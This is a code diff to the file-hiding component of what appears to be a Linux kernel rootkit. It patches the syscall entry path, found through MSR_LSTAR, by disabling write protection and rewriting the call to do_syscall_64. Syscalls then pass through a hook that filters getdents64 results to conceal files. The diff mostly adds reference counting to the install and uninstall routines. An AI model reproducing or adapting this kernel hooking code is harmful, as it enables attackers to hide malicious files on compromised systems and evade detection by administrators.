@@ -25,7 +25,7 @@ extern rootkit_t rootkit;
 //Idea: build path from entry_SYSCALL_64_trampoline to do_syscall64 by gathering addresses piece by piece
 //(1) JMP_NOSPEC %rdi -> (2) [entry_SYSCALL_64_stage2] jmp entry_SYSCALL_64_after_hwframe -> (3) [entry_SYSCALL_64] call do_syscall_64
 //                                     ||                                                 ||=====>
-//                               can be skipped ==========================================// 
+//                               can be skipped ==========================================//
 
 //sign-extended (0x48 REX.W) mov rdi, imm
 static const char *movSignExtended = "\x48\xc7\xc7";
@@ -46,36 +46,40 @@ static unsigned long old_off;
 
 void
 hide_files_lstar(void)
-{     
-    atomic_set(&syscall64_count, 0);
-    syscall_64_ptr = find_do_syscall_64((char *)read_msr(MSR_LSTAR));
+{
+    if (atomic_inc_return(&syscall64_install_count) == 1) {
+        atomic_set(&syscall64_count, 0);
+        syscall_64_ptr = find_do_syscall_64((char *)read_msr(MSR_LSTAR));
 
-    if(!do_syscall_64 || !syscall_64_ptr) {
-        DEBUG_INFO("Couldn't find do_syscall64!\n");
-        return;
+        if(!do_syscall_64 || !syscall_64_ptr) {
+            DEBUG_INFO("Couldn't find do_syscall64!\n");
+            return;
+        }
+
+        //Calculate new call offset to our function
+        //newOff = g7_syscall_64_addr - nextOpcodeAddr
+        unsigned long new_off = (unsigned long)check_getdents64 - ((unsigned long)syscall_64_ptr + 5);
+
+        disable_protection();
+        memcpy((void *)check_getdents64, "\x90\x90\x90\x90\x90", 5);
+        memcpy((syscall_64_ptr + 1), &new_off, 4);
+        enable_protection();
+
+        hexdump((char *)check_getdents64, 32);
     }
-
-    //Calculate new call offset to our function
-    //newOff = g7_syscall_64_addr - nextOpcodeAddr
-    unsigned long new_off = (unsigned long)check_getdents64 - ((unsigned long)syscall_64_ptr + 5);
-
-    disable_protection();
-    memcpy((void *)check_getdents64, "\x90\x90\x90\x90\x90", 5);
-    memcpy((syscall_64_ptr + 1), &new_off, 4);
-    enable_protection();
-
-    hexdump((char *)check_getdents64, 32);
 }
 
 void
 unhide_files_lstar(void)
 {
-    disable_protection();
-    memcpy((syscall_64_ptr + 1), &old_off, 4);
-    enable_protection();
-    
-    if ((atomic_read(&syscall64_count)) > 0)
-        msleep(10000);
+    if (atomic_dec_return(&syscall64_install_count) < 1) {
+        disable_protection();
+        memcpy((syscall_64_ptr + 1), &old_off, 4);
+        enable_protection();
+
+        if ((atomic_read(&syscall64_count)) > 0)
+            msleep(10000);
+    }
 }
 
 //Only use with multiples of 16..
@@ -88,7 +92,7 @@ hexdump(char *addr, int n)
     DEBUG_INFO("Hexdump:\n");
     while(k < n) {
         DEBUG_INFO("%02hhX %02hhX %02hhX %02hhX %02hhX %02hhX %02hhX %02hhX %02hhX %02hhX %02hhX %02hhX %02hhX %02hhX %02hhX %02hhX",
-                addr[k], addr[k + 1], addr[k + 2], addr[k + 3], addr[k + 4], addr[k + 5], addr[k + 6], addr[k + 7], addr[k + 8], addr[k + 9], 
+                addr[k], addr[k + 1], addr[k + 2], addr[k + 3], addr[k + 4], addr[k + 5], addr[k + 6], addr[k + 7], addr[k + 8], addr[k + 9],
                 addr[k + 10], addr[k + 11], addr[k + 12], addr[k + 13], addr[k + 14], addr[k + 15]);
         k += 16;
     }
@@ -167,12 +171,12 @@ g7_syscall_64(unsigned long nr, struct pt_regs *pt_regs)
     atomic_inc(&syscall64_count);
     do_syscall_64(nr, pt_regs);
 
-    //  
+    //
     //  ( ͡°Ĺ̯ ͡° )
     //
     //https://elixir.bootlin.com/linux/v4.19.163/source/fs/buffer.c#L1218
     local_irq_enable();
-    
+
     typedef struct linux_dirent64 *dirent64_t_ptr;
 
     unsigned long offset;
@@ -231,7 +235,7 @@ yield:
     local_irq_disable();
 }
 
-static unsigned long 
+static unsigned long
 read_msr(unsigned int msr)
 {
     unsigned int low, high;
